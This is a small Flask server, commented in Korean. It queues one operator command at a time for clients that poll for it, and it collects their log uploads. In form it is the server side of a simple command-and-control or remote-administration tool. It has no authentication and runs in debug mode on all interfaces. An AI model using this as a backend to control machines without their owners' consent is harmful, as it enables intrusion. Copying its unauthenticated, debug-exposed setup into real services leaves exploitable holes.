from flask import Flask, render_template, request, redirect, url_for
import datetime, os

app = Flask(__name__)

LOG_FILE = "logs.txt"
COMMAND_FILE = "command.txt"

def write_log(message):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {message}\n")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/send_command", methods=["POST"])
def send_command():
    command = request.form.get("command")
    with open(COMMAND_FILE, "w", encoding="utf-8") as f:
        f.write(command)
    write_log(f"명령 전송: {command}")
    return redirect(url_for("log_page"))

@app.route("/get_command")
def get_command():
    if os.path.exists(COMMAND_FILE):
        with open(COMMAND_FILE, "r", encoding="utf-8") as f:
            cmd = f.read().strip()
        os.remove(COMMAND_FILE)  # 명령은 1회 실행 후 삭제
        return cmd
    return ""

@app.route("/upload_log", methods=["POST"])
def upload_log():
    data = request.form.get("log")
    write_log(f"[클라이언트] {data}")
    return "OK"

@app.route("/log")
def log_page():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            logs = f.readlines()
    except FileNotFoundError:
        logs = ["아직 로그가 없습니다."]
    return render_template("log_page.html", logs=logs)

if __name__ == "__main__":
    # Gunicorn에서 실행되므로 개발용으로만 사용
    app.run(host="0.0.0.0", port=5000, debug=True)
